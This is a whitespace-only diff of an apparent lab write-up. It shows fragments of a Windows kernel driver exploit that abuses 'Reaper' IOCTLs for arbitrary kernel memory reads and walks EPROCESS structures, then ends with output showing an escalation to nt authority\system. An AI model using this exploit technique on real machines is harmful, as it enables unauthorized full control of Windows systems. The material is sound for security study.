 
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 }
@@ -1354,7 +1343,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
     userData.SrcAddress </span><span class="o">= </span><span class="p">where;
     userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
 
-    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);  
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, </span><span class="mi">NULL</span><span class="p">);
 
@@ -1364,7 +1353,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
     
-    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+    </span><span class="na">QWORD</span><span class="p"> userPsInitialProcess</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
     </span><span class="na">QWORD</span><span class="p"> offsetPsInitialProcess</span><span class="o"> =</span><span class="p"> userPsInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
     </span><span class="na">QWORD</span><span class="p"> kernelPsInitialProcess</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetPsInitialProcess;
 
@@ -1380,7 +1369,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
 
     </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
         </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
-        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);  
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
 
         currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
 
@@ -1422,7 +1411,7 @@ fffff800`101b10c4 e99c000000      jmp     Reaper+0x1165 (fffff800`101b1165)
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">C:\Users\keysvc\Desktop> </span><span class="am">exploit.exe</span><span class="p">
 Microsoft Windows [Version 10.0.19045.3208]
-(c) Microsoft Corporation. All rights reserved.  
+(c) Microsoft Corporation. All rights reserved.
 
 C:\Users\keysvc\Desktop> </span><span class="am">whoami</span><span class="p">
 nt authority\system
